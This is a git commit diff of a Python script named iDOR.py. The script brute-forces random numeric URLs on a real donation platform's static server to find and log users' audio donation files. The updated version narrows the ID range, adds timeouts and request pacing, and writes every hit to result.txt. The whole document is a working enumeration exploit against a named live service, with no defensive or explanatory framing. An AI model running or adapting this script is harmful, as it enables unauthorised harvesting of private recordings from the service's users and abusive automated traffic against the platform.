5eedb9fc32663d0ffb63a236d0fe5a588fb685fe
PhoenixKik <porosenok687@gmail.com>
2024-12-22 13:59:35 +0100

    Update iDOR.py

--- iDOR.py
+++ iDOR.py
@@ -1,20 +1,25 @@
 import requests
 from random import randrange
-
+import time
 
 while True:
-    url = "http://static.donationalerts.ru/audiodonations/"
-    rint1 = randrange(11111, 99999)
-    url = url + str(rint1) + '/'
-    rint2 = randrange(111,999)
-    url = url + str(rint1) + str(rint2) + ".wav"
-    try:
-        req = requests.get(url)
-        st = req.status_code
-        if st == 200:
-            print("connection done! " + url)
-            with open('result.txt', 'a') as file: # Saving result to result.txt
-                file.write(url + '\n')
-    except:
-        pass
+    # Generation of URL
+    base_url = "http://static.donationalerts.ru/audiodonations/"
+    rint1 = randrange(64000, 65500)
+    rint2 = randrange(111, 999)
+    url = f"{base_url}{rint1}/{rint1}{rint2}.wav"
     
+    try:
+        # Response 
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            print(f"Found! {url}")
+            with open('result.txt', 'a') as file:
+                file.write(url + '\n')
+        else:
+            print(f"Not found: {url} (статус: {response.status_code})")
+    except requests.RequestException as e:
+        print(f"Error: {e}")
+    
+    
+    time.sleep(0.02)  
